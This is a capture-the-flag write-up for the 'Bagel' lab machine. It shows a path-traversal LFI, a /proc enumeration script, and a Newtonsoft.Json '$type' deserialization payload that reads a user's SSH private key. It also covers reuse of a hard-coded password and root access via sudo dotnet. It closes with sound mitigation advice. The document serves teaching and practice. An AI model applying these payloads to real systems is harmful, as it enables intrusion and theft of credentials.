This was a really fun machine where I exploited a Local File Inclusion (LFI) vulnerability to extract a .NET application. Then reversed the .NET application to get the SSH key of a user and the password for another user. And finally, get root by running .Net with sudo.

## Enumeration

I ran Rustscan to check the machine for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt

There were three open ports.

I also scanned UDP ports, but did not find anything there.

```

### Port 22 - SSH

This is usually secure. So I kept this to the end if I didn't find anything else.

### Port 5000 - Microsoft-NetCore/2.0

This was a first for me. It promised to be interesting. I opened it in a browser and got a 400. I ran Feroxbuster to look for hidden pages. It did not find anything.

### Port 8000

I opened the site on port 8000 in a browser. I got redirected to 'bagel,htb' so I added that domain to my hosts file and reloaded the page.

![Bagel Website](/assets/images/2023/03/Bagel/BagelWebsite.png "Bagel Website")

The home page was giving information about a bagel shop. The 'Orders' page was showing a list of orders in plain text.

![Orders](/assets/images/2023/03/Bagel/Orders.png "Orders")

The home page redirected me to 'http://bagel.htb:8000/?page=index.html'. The page parameter hinted at LFI. I tried to read '/etc/passwd'.

```http
GET /?page=../../../../etc/passwd HTTP/1.1
Host: bagel.htb:8000

It worked.

I used the LFI vulnerability to try to extract more files. I tried loading configuration files for nginx and Apache. I tried to get the SSH key for both users on the machine. Nothing worked.

I used the LFI to read the command used to run the web server.

```http
GET /?page=../../../../proc/self/cmdline HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

It returned the python application's full path.

```bash
python3 /home/developer/app/app.py
```

I extracted the script.


```http
GET /?page=/home/developer/app/app.py HTTP/1.1
```

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

The application was very simple. Two routes. The first one had the LFI vulnerability in it. The second one was for the Orders page. It requested the list of orders from using websockets on port 5000.

The order code also had a comment about running the application dll and using an SSH key to connect to the server.

I copied the code in a file and started playing with it. I started by running the code from the application.

```python
#!/usr/bin/env python3

import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/")
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

```bash
$ ./ws.py
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "1:06:36",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n"
}
```

The result showed that I might be able to remove and write orders. It also added parameters that were not in the code.

I tried using 'ReadOrder' to read something other than 'orders.txt'. That failed. I tried using 'WriteOrder' to write to different files. The content I passed replaced the original orders. I tried adding parameters like 'Path' to write somewhere else, but it did not appear to do anything. I tried to use 'RemoveOrder' also, this didn't change anything either.

I experimented with the application a lot, but failed to exploit anything. Then I realized that I might be able to extract the actual application with the LFI if I knew where it was on the server. I wrote a small script to read all the command line it could find in '/proc/ID'.

```python
#!/usr/bin/env python3
import requests

for id in range(1, 20000):
    response = requests.get(f'http://bagel.htb:8000/?page=../../../../proc/{id}/cmdline')
    text = response.text
    if len(text) > 0 and text != 'File not found':
        print(f'{id} - {text}')
```

I ran it and found where the application was located.

```bash
$ ./get_processes.py

759 - /usr/lib/systemd/systemd-journald

...

923 - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
924 - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll

...
```

I used the LFI to download it.

```bash
curl "http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll" -o bagel.dll
```

I then launched a Windows VM and used [dnSpy](https://github.com/dnSpy/dnSpy) to read the .NET code.

The first thing that caught my eyes was a password in the DB class.

![DB](/assets/images/2023/03/Bagel/ClassDB.png "DB")

I tried to SSH as both users. But as the comment from the Python file said, I needed an SSH key to connect.

```bash
$ ssh phil@target
phil@target: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

$ ssh developer@target
developer@target: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

I kept looking at the code. When I sent a message to the .NET application, it would deserialize the JSON, then serialize the returned object before sending it back to me.

![Message Received Method](/assets/images/2023/03/Bagel/MessageReceived.png "Message Received Method")

The Handler class was using [Newtonsoft.Json](https://www.newtonsoft.com/json/help/html/N_Newtonsoft_Json.htm) to serialize and deserialize the JSON payload.

![Handler](/assets/images/2023/03/Bagel/ClassHandler.png "Handler")

The `TypeNameHandling = 4` part was interesting. It meant I could use `$type` to send a [different type](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) than what was expected. I tried using a [payload I found](https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f), but it failed. The typing <Base> forced me to use an instance of the Base class.

The Base class was simple.

![Base](/assets/images/2023/03/Bagel/ClassBase.png "Base")

It extended the Orders class and added a few properties. The properties add simple getters and setters.

The Orders had more to it.

![Orders](/assets/images/2023/03/Bagel/ClassOrders.png "Orders")

On deserialization, the setters of the passed in methods were called. Then immediately after, the serizalization would call the getters. Orders used the File class to read and write to the server's file system.

`WriteOrder` setter would take the value passed in the JSON and write it to a file. The getter returned a string saying if it was successful or not.

![WriteFile](/assets/images/2023/03/Bagel/WriteFile.png "WriteFile")

`ReadOrder` setter would read the content of a file. The getter returned the read content.

![ReadFile](/assets/images/2023/03/Bagel/ReadFile.png "ReadFile")

I thought I might be able to set the file location by calling `ReadOrder`, then call `WriteOrder` to write anywhere on the disk. But `ReadOrder` was removing `/` and `..` from the file path. And the File class was reading files from a hardcoded path.

![File Properties](/assets/images/2023/03/Bagel/FileProperties.png "File Properties")

The first few times I read the code, I completely ignored the `RemoveOrder` getter and setter. At first glance, they do not appear to do anything.

![RemoveOrder](/assets/images/2023/03/Bagel/RemoveOrder.png "RemoveOrder")

This code was returning an object of any type. If I gave it a File object, I would be able to call ReadFile and give it anything I wanted. The hardest thing was giving it the correct type to load a File object, but all the needed information was in dnSpy.

![Bagel Type](/assets/images/2023/03/Bagel/BagelType.png "Bagel Type")

I used this to read phil's SSH key.

```python
order = {
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null",
        "ReadFile": "../../../../../home/phil/.ssh/id_rsa"
    },
}

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/")
data = str(json.dumps(order))
print(data)
ws.send(data)
result = ws.recv()
print(result)
```

```bash
$ ./ws.py
{"RemoveOrder": {"$type": "bagel_server.File, bagel, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", "ReadFile": "../../../../../home/phil/.ssh/id_rsa"}}
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "11:53:51",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3B2 ... \n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

I saved the key to a file and used it to connect to the server and get the user flag.

```bash
$ ssh -i phil.key phil@target

## User developer

I looked at what phil could run with sudo. It required a password. I had one I found in the DB class. I tried it and it failed.

```bash
[phil@bagel ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for phil:
Sorry, try again.
[sudo] password for phil:
Sorry, try again.
```

I tried the same password to connect as developer, it worked.

```bash
[phil@bagel ~]$ su developer
Password:
[developer@bagel phil]$
```

## Root

I looked at what developer could run with sudo.

```bash
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

They could run dotnet as root. I looked on GTFOBins, and saw that I could launch system commands from the [F# interactive shell](https://gtfobins.github.io/gtfobins/dotnet/).

```bash
[developer@bagel phil]$ sudo dotnet fsi

## Mitigations

The first issue in the box was the LFI vulnerability. It was very easy to find.

```python
page = 'static/'+request.args.get('page')
if os.path.isfile(page):
    resp=send_file(page)
```

The code should have used a list of allowed pages and reject everything else. If that was not possible, it could have used [os.path.realpath](https://docs.python.org/3/library/os.path.html#os.path.realpath) to validate that the real file path was still in the static folder.

```python
>>> os.path.realpath('/var/www/../../etc/passwd', strict=True)
'/etc/passwd'
```

The .NET application should use [TypeNameHandling = 0](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) to block me from passing any object I wanted.

Once connected, I should not have been able to use a password found in the code to connect as a user. The passwords used should all be unique.

And lastly, interactive consoles should not be used with sudo. They allow running code, and there is always a way to run system commands.
